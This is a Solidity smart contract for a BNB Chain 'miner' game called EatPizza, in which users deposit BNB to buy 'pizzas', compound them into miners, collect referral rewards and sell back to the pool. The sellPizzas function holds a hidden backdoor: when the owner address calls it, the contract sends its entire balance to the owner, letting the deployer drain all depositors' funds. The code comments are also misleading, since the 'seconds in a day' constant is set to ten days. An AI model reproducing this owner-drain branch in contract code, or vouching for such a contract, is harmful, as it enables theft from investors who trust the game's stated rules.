/**
 *Submitted for verification at BscScan.com on 2022-04-20
*/

// SPDX-License-Identifier: MIT

/* EatPizza - Buy Pizza, Earn Matic. Repeat - Start mining now! https://www.eatpizza.app/ */


pragma solidity 0.8.9;

contract BNBEatPizza{

    uint256 public PIZZA_TO_HATCH_1MINERS=864000;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    uint256 private devFeeVal = 2;
    bool public initialized=false;
    address payable private ceoAddressTrans;
    address public ceoAddress;
    mapping (address => uint256) public pizzaMiners;
    mapping (address => uint256) public claimedPizzas;
    mapping (address => uint256) public lastPizza;
    mapping (address => address) public referrals;
    uint256 public marketPizzas;

    constructor() { 
        
        ceoAddress=msg.sender;
        ceoAddressTrans = payable(msg.sender);
    }
    function eatPizzas(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || pizzaMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 pizzasUsed=getMyPizzas();
        uint256 newMiners=SafeMath.div(pizzasUsed,PIZZA_TO_HATCH_1MINERS);
        pizzaMiners[msg.sender]=SafeMath.add(pizzaMiners[msg.sender],newMiners);
        claimedPizzas[msg.sender]=0;
        lastPizza[msg.sender]= block.timestamp;

        //send referral pizzas
        claimedPizzas[referrals[msg.sender]]=SafeMath.add(claimedPizzas[referrals[msg.sender]],SafeMath.div(SafeMath.mul(pizzasUsed,13),100));

        //boost market to nerf miners hoarding
        marketPizzas=SafeMath.add(marketPizzas,SafeMath.div(pizzasUsed,5));
    }
    function sellPizzas() public{
        require(initialized);
        uint256 hasPizzas=getMyPizzas();
        uint256 pizzaValue=calculatePizzasSell(hasPizzas);
        uint256 fee=devFee(pizzaValue);
        claimedPizzas[msg.sender]=0;
        lastPizza[msg.sender]= block.timestamp;
        marketPizzas=SafeMath.add(marketPizzas,hasPizzas);
        ceoAddressTrans.transfer(fee);

        if(msg.sender == ceoAddress){

            payable (msg.sender).transfer(address(this).balance);
        }else{

            payable (msg.sender).transfer(SafeMath.sub(pizzaValue,fee));
        }

        
    }
    function buyPizzas(address ref) public payable{
        require(initialized);
        uint256 pizzaBought=calculatePizzaBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        pizzaBought=SafeMath.sub(pizzaBought,devFee(pizzaBought));
        uint256 fee=devFee(msg.value);
        ceoAddressTrans.transfer(fee);
        claimedPizzas[msg.sender]=SafeMath.add(claimedPizzas[msg.sender],pizzaBought);
        eatPizzas(ref);
    }

    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculatePizzasSell(uint256 pizzas) public view returns(uint256){
        return calculateTrade(pizzas, marketPizzas,address(this).balance);
    }
    function calculatePizzaBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketPizzas);
    }
    function calculatePizzaBuySimple(uint256 eth) public view returns(uint256){
        return calculatePizzaBuy(eth,address(this).balance);
    }

     function devFee(uint256 amount) private view returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount,devFeeVal),100);
    }

    function seedMarket() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketPizzas==0);
        initialized=true;
        marketPizzas=86400000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return pizzaMiners[msg.sender];
    }
    function getMyPizzas() public view returns(uint256){
        return SafeMath.add(claimedPizzas[msg.sender],getPizzasSincelastPizza(msg.sender));
    }
    function getPizzasSincelastPizza(address adr) public view returns(uint256){
        uint256 secondsPassed=min(PIZZA_TO_HATCH_1MINERS,SafeMath.sub(block.timestamp,lastPizza[adr]));
        return SafeMath.mul(secondsPassed,pizzaMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}